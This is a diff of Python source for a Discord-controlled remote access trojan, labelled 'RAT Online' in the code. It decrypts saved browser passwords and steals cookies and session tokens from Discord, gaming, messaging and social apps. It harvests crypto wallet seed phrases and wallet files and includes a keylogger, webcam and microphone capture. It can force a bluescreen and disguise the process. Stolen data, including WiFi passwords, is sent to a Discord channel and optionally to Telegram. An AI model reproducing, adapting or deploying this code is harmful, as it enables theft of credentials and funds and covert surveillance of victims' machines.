-            conn = sqlite3.connect(temp_db)
-            cursor = conn.cursor()
-            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-            for url, username, encrypted_pass in cursor.fetchall():
-                if encrypted_pass:
-                    try:
-                        iv = encrypted_pass[3:15]
-                        payload = encrypted_pass[15:]
-                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
-                        decrypted = cipher.decrypt(payload)[:-16].decode()
-                        passwords.append(f"{browser_name} - {url}\nUser: {username}\nPass: {decrypted}\n{'-'*40}")
-                    except:
-                        pass
-            conn.close()
-            os.remove(temp_db)
-        return passwords
-    except:
-        return []
-
-def get_all_browser_passwords():
-    all_passwords = []
-    detected = []
-    browsers = {
-        "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data",
-        "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data",
-        "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data",
-        "Opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable",
-        "Vivaldi": os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data"
-    }
-    for name, path in browsers.items():
-        if os.path.exists(path):
-            detected.append(name)
-            passwords = get_browser_passwords(name, path)
-            all_passwords.extend(passwords)
-    return all_passwords, detected
-
-def get_all_browser_cookies():
-    """Extract cookies from ALL installed browsers"""
-    all_cookies = []
-    detected = []
+            pass
     
-    browsers = {
-        "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data",
-        "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data",
-        "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data",
-        "Opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable",
-        "Vivaldi": os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data",
-        "OperaGX": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera GX Stable",
-        "Chromium": os.path.expanduser("~") + r"\AppData\Local\Chromium\User Data",
-        "Firefox": os.path.expanduser("~") + r"\AppData\Roaming\Mozilla\Firefox\Profiles",
-        "Waterfox": os.path.expanduser("~") + r"\AppData\Roaming\Waterfox\Profiles",
-        "PaleMoon": os.path.expanduser("~") + r"\AppData\Roaming\Pale Moon\Profiles"
-    }
-    
-    for name, path in browsers.items():
-        if os.path.exists(path):
-            detected.append(name)
-            if name in ["Firefox", "Waterfox", "PaleMoon"]:
-                try:
-                    for profile in os.listdir(path):
-                        if profile.endswith(".default") or profile.endswith(".default-release"):
-                            cookies_path = os.path.join(path, profile, "cookies.sqlite")
-                            if os.path.exists(cookies_path):
-                                try:
-                                    conn = sqlite3.connect(cookies_path)
-                                    cursor = conn.cursor()
-                                    cursor.execute("SELECT host, name, value FROM moz_cookies")
-                                    for host, name_val, value in cursor.fetchall():
-                                        if value:
-                                            all_cookies.append({
-                                                "browser": name,
-                                                "host": host,
-                                                "name": name_val,
-                                                "value": value
-                                            })
-                                    conn.close()
-                                except:
-                                    pass
-                except:
-                    pass
-            else:
-                if CRYPTO_AVAILABLE:
-                    try:
-                        cookies = get_chrome_cookies(path)
-                        all_cookies.extend(cookies)
-                    except:
-                        pass
-    
-    return all_cookies, list(set(detected))
+    return results
+
+# ============================================================
+# BROWSER COOKIE EXTRACTION
+# ============================================================
 
 def get_chrome_cookies(browser_path):
     """Extract cookies from Chrome-based browser"""
@@ -443,8 +761,65 @@ def get_chrome_cookies(browser_path):
     
     return cookies
 
+def get_all_browser_cookies():
+    """Extract cookies from ALL installed browsers"""
+    all_cookies = []
+    detected = []
+    
+    browsers = {
+        "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data",
+        "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data",
+        "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data",
+        "Opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable",
+        "Vivaldi": os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data",
+        "OperaGX": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera GX Stable",
+        "Chromium": os.path.expanduser("~") + r"\AppData\Local\Chromium\User Data",
+        "Firefox": os.path.expanduser("~") + r"\AppData\Roaming\Mozilla\Firefox\Profiles",
+        "Waterfox": os.path.expanduser("~") + r"\AppData\Roaming\Waterfox\Profiles"
+    }
+    
+    for name, path in browsers.items():
+        if os.path.exists(path):
+            detected.append(name)
+            if name in ["Firefox", "Waterfox"]:
+                try:
+                    for profile in os.listdir(path):
+                        if profile.endswith(".default") or profile.endswith(".default-release"):
+                            cookies_path = os.path.join(path, profile, "cookies.sqlite")
+                            if os.path.exists(cookies_path):
+                                try:
+                                    conn = sqlite3.connect(cookies_path)
+                                    cursor = conn.cursor()
+                                    cursor.execute("SELECT host, name, value FROM moz_cookies")
+                                    for host, name_val, value in cursor.fetchall():
+                                        if value:
+                                            all_cookies.append({
+                                                "browser": name,
+                                                "host": host,
+                                                "name": name_val,
+                                                "value": value
+                                            })
+                                    conn.close()
+                                except:
+                                    pass
+                except:
+                    pass
+            else:
+                if CRYPTO_AVAILABLE:
+                    try:
+                        cookies = get_chrome_cookies(path)
+                        all_cookies.extend(cookies)
+                    except:
+                        pass
+    
+    return all_cookies, list(set(detected))
+
+# ============================================================
+# SCAN ALL APPS (COMPLETE VERSION)
+# ============================================================
+
 def scan_all_apps():
-    """Scan for ALL installed apps and grab their tokens/cookies"""
+    """Scan for ALL installed apps and grab their tokens/cookies + seed phrases"""
     results = []
     detected_apps = []
     
@@ -454,7 +829,6 @@ def scan_all_apps():
         os.path.expanduser("~") + r"\AppData\Roaming\DiscordPTB\Local Storage\leveldb",
         os.path.expanduser("~") + r"\AppData\Roaming\DiscordCanary\Local Storage\leveldb",
         os.path.expanduser("~") + r"\AppData\Roaming\Lightcord\Local Storage\leveldb",
-        os.path.expanduser("~") + r"\AppData\Roaming\DiscordDevelopment\Local Storage\leveldb",
     ]
     for path in discord_paths:
         if os.path.exists(path):
@@ -501,9 +875,6 @@ def scan_all_apps():
                         matches = re.findall(r'"accessToken":"([^"]+)"', data)
                         for m in matches:
                             results.append(f"🎵 Spotify Token: {m[:50]}...")
-                        matches = re.findall(r'"refreshToken":"([^"]+)"', data)
-                        for m in matches:
-                            results.append(f"🎵 Spotify Refresh: {m[:50]}...")
         except:
             pass
     
@@ -523,34 +894,24 @@ def scan_all_apps():
                             matches = re.findall(r'"access_token":"([^"]+)"', data)
                             for m in matches:
                                 results.append(f"🎮 Battle.net Token: {m[:50]}...")
-                            matches = re.findall(r'"account_id":"([^"]+)"', data)
-                            for m in matches:
-                                results.append(f"🎮 Battle.net Account: {m}")
             except:
                 pass
     
     # Riot Games
-    riot_paths = [
-        os.path.expanduser("~") + r"\AppData\Local\Riot Games\Riot Client\Data",
-        os.path.expanduser("~") + r"\AppData\Local\Riot Games\League of Legends\Config",
-    ]
-    for path in riot_paths:
-        if os.path.exists(path):
-            detected_apps.append("Riot Games")
-            try:
-                for root, dirs, files in os.walk(path):
-                    for file in files:
-                        if file.endswith(".json"):
-                            with open(os.path.join(root, file), 'r', errors='ignore') as f:
-                                data = f.read()
-                                matches = re.findall(r'"access_token":"([^"]+)"', data)
-                                for m in matches:
-                                    results.append(f"🏹 Riot Token: {m[:50]}...")
-                                matches = re.findall(r'"puuid":"([^"]+)"', data)
-                                for m in matches:
-                                    results.append(f"🏹 Riot PUUID: {m[:50]}...")
-            except:
-                pass
+    riot_path = os.path.expanduser("~") + r"\AppData\Local\Riot Games\Riot Client\Data"
+    if os.path.exists(riot_path):
+        detected_apps.append("Riot Games")
+        try:
+            for root, dirs, files in os.walk(riot_path):
+                for file in files:
+                    if file.endswith(".json"):
+                        with open(os.path.join(root, file), 'r', errors='ignore') as f:
+                            data = f.read()
+                            matches = re.findall(r'"access_token":"([^"]+)"', data)
+                            for m in matches:
+                                results.append(f"🏹 Riot Token: {m[:50]}...")
+        except:
+            pass
     
     # Epic Games
     epic_path = os.path.expanduser("~") + r"\AppData\Local\Epic Games\Launcher\Saved\Config\Windows\GameUserSettings.ini"
@@ -569,7 +930,6 @@ def scan_all_apps():
     mc_paths = [
         os.path.expanduser("~") + r"\AppData\Roaming\.minecraft\launcher_profiles.json",
         os.path.expanduser("~") + r"\AppData\Roaming\.minecraft\usercache.json",
-        os.path.expanduser("~") + r"\AppData\Roaming\.minecraft\launcher_accounts.json",
     ]
     for path in mc_paths:
         if os.path.exists(path):
@@ -583,9 +943,6 @@ def scan_all_apps():
                     matches = re.findall(r'"uuid":"([^"]+)"', data)
                     for m in matches:
                         results.append(f"⛏️ Minecraft UUID: {m}")
-                    matches = re.findall(r'"displayName":"([^"]+)"', data)
-                    for m in matches:
-                        results.append(f"⛏️ Minecraft User: {m}")
             except:
                 pass
     
@@ -620,9 +977,6 @@ def scan_all_apps():
                         matches = re.findall(r'"access_token":"([^"]+)"', data)
                         for m in matches:
                             results.append(f"🔴 Reddit Token: {m[:50]}...")
-                        matches = re.findall(r'"refresh_token":"([^"]+)"', data)
-                        for m in matches:
-                            results.append(f"🔴 Reddit Refresh: {m[:50]}...")
         except:
             pass
     
@@ -638,9 +992,6 @@ def scan_all_apps():
                         matches = re.findall(r'"sessionid":"([^"]+)"', data)
                         for m in matches:
                             results.append(f"🎵 TikTok Session: {m[:50]}...")
-                        matches = re.findall(r'"csrf_token":"([^"]+)"', data)
-                        for m in matches:
-                            results.append(f"🎵 TikTok CSRF: {m[:50]}...")
         except:
             pass
     
@@ -675,13 +1026,10 @@ def scan_all_apps():
                         matches = re.findall(r'"token":"([^"]+)"', data)
                         for m in matches:
                             results.append(f"💬 WhatsApp Token: {m[:50]}...")
-                        matches = re.findall(r'"session":"([^"]+)"', data)
-                        for m in matches:
-                            results.append(f"💬 WhatsApp Session: {m[:50]}...")
         except:
             pass
     
-    # Browser Cookies (if crypto available)
+    # BROWSER COOKIES
     if CRYPTO_AVAILABLE:
         cookies, browser_detected = get_all_browser_cookies()
         for app in browser_detected:
@@ -690,421 +1038,48 @@ def scan_all_apps():
         for c in cookies[:100]:
             results.append(f"🍪 Browser: {c['browser']} | {c['host']} | {c['name']} = {c['value'][:50]}...")
     
+    # WALLET SEED PHRASES
+    seed_results = scan_for_seed_phrases()
+    for sr in seed_results:
+        results.append(f"🔑 SEED PHRASE ({sr['words']} words): {sr['phrase']}\n   File: {sr['file']}")
+        if "Seed Phrase" not in detected_apps:
+            detected_apps.append("Seed Phrase")
+    
+    # WALLET FILES
+    wallet_paths = [
+        (os.path.expanduser("~") + r"\AppData\Roaming\Exodus", "Exodus Wallet"),
+        (os.path.expanduser("~") + r"\AppData\Roaming\Atomic", "Atomic Wallet"),
+        (os.path.expanduser("~") + r"\AppData\Roaming\Electrum", "Electrum Wallet"),
+        (os.path.expanduser("~") + r"\AppData\Roaming\Coinomi", "Coinomi Wallet"),
+        (os.path.expanduser("~") + r"\AppData\Roaming\Trust Wallet", "Trust Wallet"),
+        (os.path.expanduser("~") + r"\AppData\Roaming\Wasabi", "Wasabi Wallet"),
+        (os.path.expanduser("~") + r"\AppData\Roaming\Ledger Live", "Ledger Live"),
+        (os.path.expanduser("~") + r"\AppData\Local\Guarda", "Guarda Wallet"),
+        (os.path.expanduser("~") + r"\AppData\Roaming\Binance", "Binance Wallet"),
+        (os.path.expanduser("~") + r"\AppData\Local\Jaxx", "Jaxx Wallet"),
+        (os.path.expanduser("~") + r"\AppData\Local\Coinbase", "Coinbase Wallet"),
+    ]
+    for path, name in wallet_paths:
+        if os.path.exists(path):
+            if name not in detected_apps:
+                detected_apps.append(name)
+            try:
+                for root, dirs, files in os.walk(path):
+                    for file in files:
+                        if file.endswith(('.json', '.dat', '.wallet', '.key')):
+                            file_path = os.path.join(root, file)
+                            if os.path.getsize(file_path) < 500000:
+                                with open(file_path, 'r', errors='ignore') as f:
+                                    data = f.read()
+                                    results.append(f"💰 {name} File: {file_path}\n   Data: {data[:200]}...")
+            except:
+                pass
+    
     return results, list(set(detected_apps))
 
-def grab_all_tokens():
-    tokens = []
-    detected_apps = []
-    discord_paths = [
-        os.path.expanduser("~") + r"\AppData\Roaming\Discord\Local Storage\leveldb",
-        os.path.expanduser("~") + r"\AppData\Roaming\DiscordPTB\Local Storage\leveldb",
-        os.path.expanduser("~") + r"\AppData\Roaming\DiscordCanary\Local Storage\leveldb",
-        os.path.expanduser("~") + r"\AppData\Roaming\Lightcord\Local Storage\leveldb",
-    ]
-    for path in discord_paths:
-        if os.path.exists(path):
-            detected_apps.append("Discord")
-            try:
-                for file in os.listdir(path):
-                    if file.endswith((".log", ".ldb")):
-                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
-                            data = f.read()
-                            matches = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', data)
-                            for match in matches:
-                                tokens.append(f"🟣 Discord Token: {match}")
-                            matches = re.findall(r'mfa\.[\w-]{84}', data)
-                            for match in matches:
-                                tokens.append(f"🟣 Discord MFA: {match}")
-            except:
-                pass
-    chrome_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default"
-    if os.path.exists(chrome_path):
-        detected_apps.append("Chrome")
-        try:
-            cookies_db = os.path.join(chrome_path, "Cookies")
-            if os.path.exists(cookies_db):
-                temp_db = os.environ['TEMP'] + "\\cookies.db"
-                shutil.copy2(cookies_db, temp_db)
-                conn = sqlite3.connect(temp_db)
-                cursor = conn.cursor()
-                cursor.execute("SELECT host_key, name, value FROM cookies WHERE name LIKE '%token%' OR name LIKE '%auth%' OR name LIKE '%session%' OR name LIKE '%refresh%'")
-                for host, name, value in cursor.fetchall():
-                    if value and len(str(value)) > 10:
-                        tokens.append(f"🍪 Cookie: {host} - {name} ({str(value)[:30]}...)")
-                conn.close()
-                os.remove(temp_db)
-        except:
-            pass
-    steam_path = os.path.expanduser("~") + r"\AppData\Local\Steam\config\loginusers.vdf"
-    if os.path.exists(steam_path):
-        detected_apps.append("Steam")
-        try:
-            with open(steam_path, 'r', errors='ignore') as f:
-                data = f.read()
-                matches = re.findall(r'"AccountName"\s*"([^"]+)"', data)
-                for match in matches:
-                    tokens.append(f"🎮 Steam Account: {match}")
-                matches = re.findall(r'"SteamID"\s*"([^"]+)"', data)
-                for match in matches:
-                    tokens.append(f"🎮 Steam ID: {match}")
-        except:
-            pass
-    epic_path = os.path.expanduser("~") + r"\AppData\Local\Epic Games\Launcher\Saved\Config\Windows\GameUserSettings.ini"
-    if os.path.exists(epic_path):
-        detected_apps.append("Epic Games")
-        try:
-            with open(epic_path, 'r', errors='ignore') as f:
-                data = f.read()
-                matches = re.findall(r'[a-f0-9]{32}', data)
-                for match in matches:
-                    tokens.append(f"🎯 Epic Games: {match}")
-        except:
-            pass
-    mc_paths = [
-        os.path.expanduser("~") + r"\AppData\Roaming\.minecraft\launcher_profiles.json",
-        os.path.expanduser("~") + r"\AppData\Roaming\.minecraft\usercache.json"
-    ]
-    for path in mc_paths:
-        if os.path.exists(path):
-            detected_apps.append("Minecraft")
-            try:
-                with open(path, 'r', errors='ignore') as f:
-                    data = f.read()
-                    matches = re.findall(r'"accessToken":"([^"]+)"', data)
-                    for match in matches:
-                        tokens.append(f"⛏️ Minecraft: {match[:20]}...")
-                    matches = re.findall(r'"uuid":"([^"]+)"', data)
-                    for match in matches:
-                        tokens.append(f"⛏️ Minecraft UUID: {match}")
-            except:
-                pass
-    spotify_path = os.path.expanduser("~") + r"\AppData\Roaming\Spotify\Users"
-    if os.path.exists(spotify_path):
-        detected_apps.append("Spotify")
-        try:
-            for file in os.listdir(spotify_path):
-                if file.endswith(".json"):
-                    with open(os.path.join(spotify_path, file), 'r', errors='ignore') as f:
-                        data = f.read()
-                        matches = re.findall(r'"accessToken":"([^"]+)"', data)
-                        for match in matches:
-                            tokens.append(f"🎵 Spotify: {match[:30]}...")
-        except:
-            pass
-    riot_path = os.path.expanduser("~") + r"\AppData\Local\Riot Games\Riot Client\Data"
-    if os.path.exists(riot_path):
-        detected_apps.append("Riot Games")
-        try:
-            for root, dirs, files in os.walk(riot_path):
-                for file in files:
-                    if file.endswith(".json"):
-                        with open(os.path.join(root, file), 'r', errors='ignore') as f:
-                            data = f.read()
-                            matches = re.findall(r'"[a-zA-Z0-9_-]{30,}"', data)
-                            for match in matches:
-                                if len(match) > 30:
-                                    tokens.append(f"🏹 Riot Games: {match[:30]}...")
-        except:
-            pass
-    roblox_path = os.path.expanduser("~") + r"\AppData\Local\Roblox\Local Storage\leveldb"
-    if os.path.exists(roblox_path):
-        detected_apps.append("Roblox")
-        try:
-            for file in os.listdir(roblox_path):
-                if file.endswith((".log", ".ldb")):
-                    with open(os.path.join(roblox_path, file), 'r', errors='ignore') as f:
-                        data = f.read()
-                        matches = re.findall(r'"_|ROBLOSECURITY":"([^"]+)"', data)
-                        for match in matches:
-                            tokens.append(f"🧱 Roblox: {match[:30]}...")
-        except:
-            pass
-    reddit_path = os.path.expanduser("~") + r"\AppData\Roaming\Reddit\Local Storage\leveldb"
-    if os.path.exists(reddit_path):
-        detected_apps.append("Reddit")
-        try:
-            for file in os.listdir(reddit_path):
-                if file.endswith((".log", ".ldb")):
-                    with open(os.path.join(reddit_path, file), 'r', errors='ignore') as f:
-                        data = f.read()
-                        matches = re.findall(r'"access_token":"([^"]+)"', data)
-                        for match in matches:
-                            tokens.append(f"🔴 Reddit: {match[:30]}...")
-        except:
-            pass
-    tiktok_path = os.path.expanduser("~") + r"\AppData\Roaming\TikTok\Local Storage\leveldb"
-    if os.path.exists(tiktok_path):
-        detected_apps.append("TikTok")
-        try:
-            for file in os.listdir(tiktok_path):
-                if file.endswith((".log", ".ldb")):
-                    with open(os.path.join(tiktok_path, file), 'r', errors='ignore') as f:
-                        data = f.read()
-                        matches = re.findall(r'"sessionid":"([^"]+)"', data)
-                        for match in matches:
-                            tokens.append(f"🎵 TikTok: {match[:30]}...")
-        except:
-            pass
-    battlenet_path = os.path.expanduser("~") + r"\AppData\Local\Battle.net\Blizzard\Local Storage\leveldb"
-    if os.path.exists(battlenet_path):
-        detected_apps.append("Battle.net")
-        try:
-            for file in os.listdir(battlenet_path):
-                if file.endswith((".log", ".ldb")):
-                    with open(os.path.join(battlenet_path, file), 'r', errors='ignore') as f:
-                        data = f.read()
-                        matches = re.findall(r'"access_token":"([^"]+)"', data)
-                        for match in matches:
-                            tokens.append(f"🎮 Battle.net: {match[:30]}...")
-        except:
-            pass
-    telegram_paths = [
-        os.path.expanduser("~") + r"\AppData\Roaming\Telegram Desktop\tdata",
-        os.path.expanduser("~") + r"\AppData\Roaming\Telegram Desktop\tdummy"
-    ]
-    for path in telegram_paths:
-        if os.path.exists(path):
-            detected_apps.append("Telegram")
-            try:
-                for file in os.listdir(path):
-                    if file.endswith(".s"):
-                        with open(os.path.join(path, file), 'rb') as f:
-                            data = f.read()
-                            matches = re.findall(rb'\d+:[a-zA-Z0-9_-]{35}', data)
-                            for match in matches:
-                                tokens.append(f"🔵 Telegram: {match.decode('utf-8', errors='ignore')}")
-            except:
-                pass
-    wa_path = os.path.expanduser("~") + r"\AppData\Roaming\WhatsApp\Local Storage\leveldb"
-    if os.path.exists(wa_path):
-        detected_apps.append("WhatsApp")
-        try:
-            for file in os.listdir(wa_path):
-                if file.endswith((".log", ".ldb")):
-                    with open(os.path.join(wa_path, file), 'r', errors='ignore') as f:
-                        data = f.read()
-                        matches = re.findall(r'"token":"([^"]+)"', data)
-                        for match in matches:
-                            tokens.append(f"💬 WhatsApp: {match[:30]}...")
-        except:
-            pass
-    return tokens, list(set(detected_apps))
-
-def get_idle_time():
-    class LASTINPUTINFO(ctypes.Structure):
-        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
-    lastInputInfo = LASTINPUTINFO()
-    lastInputInfo.cbSize = ctypes.sizeof(LASTINPUTINFO)
-    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lastInputInfo))
-    millis = ctypes.windll.kernel32.GetTickCount() - lastInputInfo.dwTime
-    seconds = millis // 1000
-    return f"{seconds//3600}h {(seconds%3600)//60}m {seconds%60}s"
-
-def capture_webcam(cam_id=0):
-    cap = cv2.VideoCapture(cam_id)
-    if not cap.isOpened():
-        return None
-    ret, frame = cap.read()
-    if ret:
-        path = os.environ['TEMP'] + "\\webcam.jpg"
-        cv2.imwrite(path, frame)
-        cap.release()
-        return path
-    cap.release()
-    return None
-
-def record_mic(duration=10):
-    if not AUDIO_AVAILABLE:
-        return None
-    CHUNK = 1024
-    FORMAT = pyaudio.paInt16
-    CHANNELS = 1
-    RATE = 44100
-    p = pyaudio.PyAudio()
-    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
-    frames = [stream.read(CHUNK) for _ in range(0, int(RATE / CHUNK * duration))]
-    stream.stop_stream()
-    stream.close()
-    p.terminate()
-    path = os.environ['TEMP'] + "\\mic.wav"
-    wf = wave.open(path, 'wb')
-    wf.setnchannels(CHANNELS)
-    wf.setsampwidth(p.get_sample_size(FORMAT))
-    wf.setframerate(RATE)
-    wf.writeframes(b''.join(frames))
-    wf.close()
-    return path
-
-def speak(text):
-    engine = pyttsx3.init()
-    engine.say(text)
-    engine.runAndWait()
-
-def show_message_box(text):
-    ctypes.windll.user32.MessageBoxW(0, text, "System Message", 0)
-
-def set_wallpaper(image_path):
-    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
-
-def block_input(block):
-    ctypes.windll.user32.BlockInput(block)
-
-def make_critical():
-    global critical_mode
-    try:
-        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
-        critical_mode = True
-        return True
-    except:
-        return False
-
-def bluescreen():
-    if not is_admin():
-        return False
-    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
-    ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
-    return True
-
-def hide_process():
-    if is_admin():
-        ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
-        return True
-    return False
-
-def start_keylog():
-    global keylog_active
-    keylog_active = True
-    from pynput import keyboard
-    def on_press(key):
-        if not keylog_active:
-            return False
-        with open(keylog_file, 'a', encoding='utf-8') as f:
-            try:
-                if hasattr(key, 'char') and key.char:
-                    f.write(key.char)
-                elif key == key.space:
-                    f.write(' ')
-                elif key == key.enter:
-                    f.write('\n')
-                else:
-                    f.write(f'[{str(key).replace("Key.", "").upper()}]')
-            except:
-                pass
-    listener = keyboard.Listener(on_press=on_press)
-    listener.start()
-    listener.join()
-
-def start_shake(duration_seconds=10):
-    global shake_active
-    if shake_active:
-        return False
-    shake_active = True
-    def shake_loop():
-        global shake_active
-        start_time = time.time()
-        while shake_active and (time.time() - start_time) < duration_seconds:
-            x, y = pyautogui.position()
-            for dx, dy in [(0, 10), (10, 0), (0, -10), (-10, 0)]:
-                if not shake_active:
-                    break
-                pyautogui.moveTo(x + dx, y + dy, duration=0.01)
-                time.sleep(0.01)
-            time.sleep(0.02)
-        shake_active = False
-    thread = threading.Thread(target=shake_loop, daemon=True)
-    thread.start()
-    return True
-
-def stop_shake():
-    global shake_active
-    shake_active = False
-    return True
-
-def get_recent_downloads():
-    downloads = []
-    try:
-        downloads_path = get_folder_path('downloads')
-        if os.path.exists(downloads_path):
-            files = os.listdir(downloads_path)
-            for f in sorted(files, key=lambda x: os.path.getmtime(os.path.join(downloads_path, x)), reverse=True)[:30]:
-                path = os.path.join(downloads_path, f)
-                if os.path.isfile(path):
-                    size = os.path.getsize(path)
-                    size_str = f"{size/1024:.1f} KB" if size < 1048576 else f"{size/1048576:.1f} MB"
-                    mtime = datetime.fromtimestamp(os.path.getmtime(path)).strftime('%Y-%m-%d %H:%M')
-                    downloads.append(f"📄 {f}\n   Size: {size_str} | Modified: {mtime}\n")
-        return downloads if downloads else ["No recent downloads found"]
-    except:
-        return ["Error getting downloads"]
-
-def get_installed_programs():
-    programs = []
-    try:
-        key_paths = [
-            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
-            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
-        ]
-        for key_path in key_paths:
-            try:
-                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
-                for i in range(0, winreg.QueryInfoKey(key)[0]):
-                    try:
-                        subkey_name = winreg.EnumKey(key, i)
-                        subkey = winreg.OpenKey(key, subkey_name)
-                        try:
-                            name = winreg.QueryValueEx(subkey, "DisplayName")[0]
-                            if name:
-                                try:
-                                    version = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
-                                    programs.append(f"{name} (v{version})")
-                                except:
-                                    programs.append(name)
-                        except:
-                            pass
-                        winreg.CloseKey(subkey)
-                    except:
-                        pass
-                winreg.CloseKey(key)
-            except:
-                pass
-        try:
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
-            for i in range(0, winreg.QueryInfoKey(key)[0]):
-                try:
-                    subkey_name = winreg.EnumKey(key, i)
-                    subkey = winreg.OpenKey(key, subkey_name)
-                    try:
-                        name = winreg.QueryValueEx(subkey, "DisplayName")[0]
-                        if name:
-                            programs.append(f"👤 {name}")
-                    except:
-                        pass
-                    winreg.CloseKey(subkey)
-                except:
-                    pass
-            winreg.CloseKey(key)
-        except:
-            pass
-        return list(set(programs)) if programs else ["No programs found"]
-    except:
-        return ["Error getting installed programs"]
-
-def get_file_emoji(filename):
-    ext = os.path.splitext(filename)[1].lower()
-    emoji_map = {
-        '.txt': '📄', '.py': '🐍', '.pyw': '🐍', '.exe': '⚙️', '.dll': '🔧',
-        '.jpg': '🖼️', '.jpeg': '🖼️', '.png': '🖼️', '.gif': '🖼️', '.bmp': '🖼️', '.webp': '🖼️', '.ico': '🖼️', '.svg': '🖼️',
-        '.mp3': '🎵', '.wav': '🎵', '.flac': '🎵', '.aac': '🎵', '.ogg': '🎵', '.wma': '🎵',
-        '.mp4': '🎬', '.avi': '🎬', '.mkv': '🎬', '.mov': '🎬', '.wmv': '🎬', '.flv': '🎬', '.webm': '🎬', '.m4v': '🎬',
-        '.zip': '📦', '.rar': '📦', '.7z': '📦', '.tar': '📦', '.gz': '📦',
-        '.pdf': '📕', '.doc': '📘', '.docx': '📘', '.xls': '📊', '.xlsx': '📊',
-        '.lua': '📜', '.json': '📋', '.xml': '📋', '.html': '🌐', '.css': '🎨', '.js': '⚡',
-        '.iso': '💿', '.msi': '📦', '.bat': '💻', '.cmd': '💻', '.ps1': '💻',
-        '.reg': '📝', '.ini': '📝', '.cfg': '📝', '.conf': '📝', '.log': '📋',
-        '.ttf': '🔤', '.otf': '🔤', '.woff': '🔤',
-        '.apk': '📱', '.ipa': '📱', '.torrent': '🧲'
-    }
-    return emoji_map.get(ext, '📄')
+# ============================================================
+# BOT COMMANDS
+# ============================================================
 
 def is_authorized():
     async def auth(ctx):
@@ -1125,6 +1100,10 @@ async def on_ready():
     embed = discord.Embed(title="RAT Online", description=f"Prefix: `{Config.PREFIX}`\nUser: `{get_displayname()}`\nAdmin: {is_admin()}", color=discord.Color.green())
     await bot.get_channel(Config.MAIN_CHANNEL).send(embed=embed)
 
+# ============================================================
+# FULL SYSTEM INFO COMMAND
+# ============================================================
+
 @bot.command(name='info')
 @is_authorized()
 async def system_info(ctx):
@@ -1139,6 +1118,7 @@ async def system_info(ctx):
         ip_info = get_ipinfo()
         mac_address = get_macaddress()
         wifi_profiles = get_wifipasswords()
+        
         embed = discord.Embed(title="System Information", color=discord.Color.blue())
         embed.add_field(name="Display Name", value=f"```{display_name}```", inline=False)
         embed.add_field(name="HWID", value=f"```{hwid}```", inline=False)
@@ -1156,139 +1136,103 @@ async def system_info(ctx):
         embed.add_field(name="OS", value=f"```{platform.system()} {platform.release()}```", inline=True)
         boot_time = datetime.fromtimestamp(psutil.boot_time())
         embed.add_field(name="Boot Time", value=f"```{boot_time.strftime('%Y-%m-%d %H:%M:%S')}```", inline=True)
+        
         if wifi_profiles:
             wifi_str = "\n".join([f"{w['name']}: {w['password']}" for w in wifi_profiles[:5]])
-            embed.add_field(name="WiFi", value=f"```{wifi_str}```", inline=False)
+            embed.add_field(name="WiFi Passwords", value=f"```{wifi_str}```", inline=False)
+        
         await ctx.send(embed=embed)
+        
+        # Send via Telegram if configured
+        if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"]:
+            content = f"System Info:\nDisplay Name: {display_name}\nHWID: {hwid}\nCPU: {cpu_info}\nRAM: {ram_info}\nIP: {ip_info['ip']}\nLocation: {ip_info['city']}, {ip_info['country']}"
+            send_to_telegram(f"<b>📊 System Info</b>\n\n{content}")
+            
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
-@bot.command(name='lock')
-@is_authorized()
-async def lock_pc(ctx):
-    try:
-        ctypes.windll.user32.LockWorkStation()
-        await send_embed(ctx, "Locked", "Workstation locked", discord.Color.orange())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
+# ============================================================
+# ULTIMATE GRAB COMMAND
+# ============================================================
 
-@bot.command(name='crash')
+@bot.command(name='grab')
 @is_authorized()
-async def blue_screen(ctx):
-    try:
-        bluescreen()
-        await send_embed(ctx, "BSOD", "Triggered", discord.Color.dark_red())
-    except:
-        await send_embed(ctx, "BSOD Failed", "Admin required", discord.Color.red())
+async def grab_all(ctx):
+    """ULTIMATE GRAB - Browser Cookies + App Tokens + Seed Phrases + Wallet Files"""
